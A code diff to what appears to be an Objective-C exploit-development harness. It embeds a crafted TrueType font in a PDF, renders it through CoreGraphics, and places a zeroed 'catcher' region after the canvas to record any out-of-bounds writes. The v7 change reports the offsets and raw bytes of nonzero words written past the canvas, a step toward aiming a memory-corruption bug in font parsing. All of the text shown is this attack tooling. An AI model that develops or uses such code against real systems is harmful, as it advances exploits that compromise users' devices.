@@ -48,7 +48,7 @@ static void p072v5_fault(int sig) {
 #import <string.h>
 #import <unistd.h>
 
-#define P072_BUILD @"p072-86950-aimed-oob-v6"
+#define P072_BUILD @"p072-86950-oob-quadscan-v7"
 
 static void p072_dl(void (^L)(NSString *), const char *path) {
     void *h = dlopen(path, RTLD_LAZY);
@@ -674,7 +674,7 @@ static NSData *p072v3_build_pdf(NSData *ttf){
             uint8_t *canvas = (uint8_t *)block;
             uint8_t *catcher = (uint8_t *)block + CVBYTES;
             memset(canvas, 0, CVBYTES);
-            memset(catcher, 0xAB, CATCHBYTES);
+            memset(catcher, 0, CATCHBYTES);   /* v7: zero fill - any nonzero quad = a write */
             Lv([NSString stringWithFormat:@"v5 [alloc] block=%p canvas=%p catcher=%p contiguous",
                 (void*)block, (void*)canvas, (void*)catcher]);
             CGDataProviderRef dpV5 = CGDataProviderCreateWithCFData((__bridge CFDataRef)ttf3);
@@ -710,21 +710,30 @@ static NSData *p072v3_build_pdf(NSData *ttf){
                             CGContextFlush(c5);
                             CGContextRelease(c5);
                             p072v5_in = 0;
-                            /* scan the WHOLE block; classify canvas vs catcher */
+                            /* v7 quadscan: nonzero quads (byte-order agnostic),
+                               report first 8 quads' raw bytes */
                             long hits = 0; long first = -1; long last = -1;
                             long chit=0, cfirst=-1, clast=-1;
+                            char hexbuf[128]; NSUInteger hexn = 0;
+                            hexbuf[0]=0;
                             for (vm_size_t o = 0; o + 3 < CVBYTES + CATCHBYTES; o += 4) {
-                                if (canvas[o]==0xFF && canvas[o+1]==0 && canvas[o+2]==0 && canvas[o+3]==0xFF) {
+                                if (canvas[o]|canvas[o+1]|canvas[o+2]|canvas[o+3]) {
                                     if (first < 0) first = (long)o;
                                     last = (long)o; hits++;
                                     if (o >= CVBYTES) {
                                         if (cfirst < 0) cfirst = (long)(o - CVBYTES);
                                         clast = (long)(o - CVBYTES); chit++;
+                                        if (chit <= 8) {
+                                            hexn += snprintf(hexbuf+hexn, sizeof(hexbuf)-hexn,
+                                                " [%02x%02x%02x%02x@+0x%lx]",
+                                                canvas[o],canvas[o+1],canvas[o+2],canvas[o+3],
+                                                (unsigned long)(o - CVBYTES));
+                                        }
                                     }
                                 }
                             }
-                            Lv([NSString stringWithFormat:@"v5 [FIRE size=%.0f] SURVIVED - all-block red-quad hits=%ld first=+0x%lx last=+0x%lx | catcher hits=%ld first=+0x%lx last=+0x%lx",
-                                v5sizes[si], hits, first, last, chit, cfirst, clast]);
+                            Lv([NSString stringWithFormat:@"v5 [FIRE size=%.0f] SURVIVED - nonzero-quad hits=%ld first=+0x%lx last=+0x%lx | catcher hits=%ld first=%lx last=%lx | quads:%s",
+                                v5sizes[si], hits, first, last, chit, cfirst, clast, hexbuf]);
                         } else {
                             p072v5_in = 0;
                             Lv(@"v5 [ctx] FAIL");
